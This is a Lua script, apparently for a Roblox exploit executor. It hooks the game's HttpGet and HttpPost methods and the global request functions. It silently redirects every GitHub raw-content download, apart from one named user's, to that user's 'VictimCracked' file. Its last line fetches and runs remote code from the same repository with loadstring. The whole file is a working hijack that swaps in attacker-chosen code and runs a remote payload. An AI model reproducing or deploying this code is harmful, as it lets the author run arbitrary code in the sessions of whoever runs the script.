local targetUser = "musica777420xdads"
local redirectUrl = "https://raw.githubusercontent.com/musica777420xdads/VictimCracked/refs/heads/main/testt"

local oldIndex
oldIndex = hookmetamethod(game, "__index", function(self, key)
    if (key == "HttpGet" or key == "HttpPost") then
        local originalMethod = oldIndex(self, key)
        
        return function(instance, url, ...)
            if type(url) == "string" and url:find("githubusercontent.com") and not url:find(targetUser) then
                warn("Intercepted via Index: " .. url)
                return originalMethod(instance, redirectUrl, ...)
            end
            return originalMethod(instance, url, ...)
        end
    end
    return oldIndex(self, key)
end)

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if (method == "HttpGet" or method == "HttpPost") and type(args[1]) == "string" then
        if args[1]:find("githubusercontent.com") and not args[1]:find(targetUser) then
            args[1] = redirectUrl
            setnamecallmethod(method)
            return oldNamecall(self, unpack(args))
        end
    end
    return oldNamecall(self, ...)
end)

local function hookRequest(funcName)
    local original = getgenv()[funcName]
    if original then
        getgenv()[funcName] = function(options)
            if type(options) == "table" and options.Url and options.Url:find("githubusercontent.com") then
                if not options.Url:find(targetUser) then
                    options.Url = redirectUrl
                end
            end
            return original(options)
        end
    end
end

hookRequest("request")
hookRequest("http_request")
if syn then hookRequest("syn.request") end

loadstring(game:HttpGet("https://raw.githubusercontent.com/musica777420xdads/VictimCracked/refs/heads/main/main"))()
